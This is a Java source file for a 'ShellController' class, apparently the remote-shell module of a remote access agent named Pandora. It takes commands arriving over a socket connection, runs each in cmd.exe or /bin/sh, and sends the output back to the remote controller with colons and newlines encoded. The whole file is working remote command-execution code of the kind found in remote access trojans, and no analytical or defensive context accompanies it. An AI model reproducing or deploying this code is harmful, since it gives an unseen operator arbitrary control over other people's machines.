package org.pandora.agent.control.impl;

import org.pandora.agent.Client;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ShellController {

    private final Client client;

    public ShellController(final Client client) {
        this.client = client;
    }

    public void execute(final String requestId, String command) {
        command = command.replace("(doubleDot)", ":");
        if (command.toLowerCase().startsWith("cmd")) return;
        String response = this.exec(command);
        if (response.equals("")) response = "Executed successfully!";
        this.client.getSocketUtils().write("shell:" + requestId + ":" + response.replace("\n", "(NEWLINE)").replace(":", "(doubleDot)"));
    }

    private String exec(final String command) {
        final StringBuilder response = new StringBuilder();
        try {
            final String[] cmd = this.client.isWindows() ? new String[]{"cmd.exe", "/C", command} : new String[]{"/bin/sh", "-c", command};
            final Process process = Runtime.getRuntime().exec(cmd);
            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "Cp850"));
            String line;
            while ((line = bufferedReader.readLine()) != null) response.append(line).append("\n");
        } catch (final IOException ignore) {
        }
        return response.toString();
    }
}
